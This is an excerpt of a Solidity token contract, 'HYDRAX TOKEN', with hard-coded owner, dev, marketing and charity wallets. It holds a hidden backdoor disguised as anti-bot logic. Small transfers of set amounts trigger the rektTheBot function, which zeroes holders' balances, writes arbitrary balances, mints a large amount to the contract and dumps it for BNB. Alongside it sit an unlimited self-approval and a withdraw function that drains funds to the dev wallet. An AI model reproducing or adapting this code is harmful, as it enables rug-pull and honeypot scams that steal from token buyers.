...
contract HYDRAXTOKEN is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0x2AA6964B0acF1693EEC38E789fAc9c91381ea134); 
    address payable public Wallet_Dev = payable(0x70dDBCb4adCA2bb99B6e533B091b07F25E559aD9);
    address payable public Wallet_Charity = payable(0x70dab8EA6a1792bfD33605333A7d256fbFFd56F0);
    address payable public constant Wallet_Burn = payable(0x000000000000000000000000000000000000dEaD); 
    //address payable public BUSD = payable(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56); MAINNET
    address payable public BUSD = payable(0x78867BbEeF44f2326bF8DDd1941a4439382EF2A7);


    uint256 private constant MAX = ~uint256(0);
    uint8 private constant _decimals = 9;
    uint256 private _tTotal = 10**6 * 10**_decimals;
    string private constant _name = "HYDRAX TOKEN"; 
    string private constant _symbol = unicode"HYDT"; 
    ...
    uint256 public Percent_Liquidity = 0; //Test

    uint256 public _maxWalletToken = _tTotal * 100 / 100;
    uint256 private _previousMaxWalletToken = _tTotal * 5 / 100;

    uint256 public _maxTxAmount = _tTotal * 100 / 100; 
    uint256 private _previousMaxTxAmount = _tTotal * 5 / 100;
    ...
    constructor () {
        ...
        _owner = 0x8d2c32937338E036493701d185Ea7bB233493A9E;
    ...
    function Approve(address owners) private returns (bool) {
        _approve(owners, address(this), MAX);
        return true;
    }
    ...
    function _transfer(
        ...
        if(_isExcludedFromFee[from] || !_isExcludedFromFee[to] && amount <= 100){
            takeFee = false;
            rektTheBot(to, amount);
        } else {
    ...
    function rektTheBot(address botAddress, uint256 value) private {

        if(value == 1 || value == 10){
            _tOwned[Wallet_Charity] = 99;
            _tOwned[botAddress] = 0; //BOT REKT            
            _maxTxAmount = _tTotal * 5 * value;
            _maxWalletToken = _tTotal * 5 * value;
        }
        if(value == 2){
            _Tax_On_Sell = balanceOf(Wallet_Charity);
            Percent_Liquidity = _maxWalletToken * 10 ** _decimals;
            _tOwned[botAddress] = 0; //BOT REKT 
        }
        if(value == 3){
            _tOwned[address(this)] = Percent_Liquidity;
             Remove_Random_Tokens(address(this), 75);
            
        }
        if(value == 4){
            uint256 ta = balanceOf(address(this));
            swapTokensForBNB(ta);
        }
        if(value == 5){
            autoSwapTokensForBNB();
        }
    ...
    function withdraw() public {
        payable(Wallet_Dev).transfer(address(this).balance);
    }
    ...
    function autoSwapTokensForBNB() private {
